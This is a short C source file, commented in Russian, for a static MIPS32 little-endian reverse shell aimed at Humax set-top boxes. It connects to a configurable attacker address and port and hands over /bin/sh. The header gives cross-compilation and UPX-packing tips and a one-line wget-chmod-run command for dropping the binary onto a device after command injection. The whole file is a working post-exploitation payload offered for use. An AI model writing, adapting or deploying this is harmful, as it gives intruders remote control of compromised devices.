/*
 * MIPS32 LE reverse shell for Humax STB.
 * Статически линкуется, загружается через wget после получения code execution.
 *
 * Кросс-компиляция:
 *   mipsel-linux-gnu-gcc -static -Os -o reverse_shell reverse_shell.c
 *   # или с musl:
 *   mipsel-linux-musl-gcc -static -Os -o reverse_shell reverse_shell.c
 *
 * Размер: ~20KB static с musl, ~700KB с glibc.
 * Для минимального размера: strip + upx --best reverse_shell
 *
 * Использование на STB (после получения command injection / RCE):
 *   wget http://ATTACKER_IP/shell -O /tmp/sh && chmod +x /tmp/sh && /tmp/sh
 *
 * Конфигурация: изменить ATTACKER_IP и ATTACKER_PORT ниже.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define ATTACKER_IP   "192.168.1.100"  /* <-- ИЗМЕНИТЬ */
#define ATTACKER_PORT 4444             /* <-- ИЗМЕНИТЬ */

int main(void)
{
    struct sockaddr_in sa;
    int fd;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
        return 1;

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(ATTACKER_PORT);
    inet_aton(ATTACKER_IP, &sa.sin_addr);

    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        return 1;

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    execl("/bin/sh", "sh", NULL);
    return 1;
}
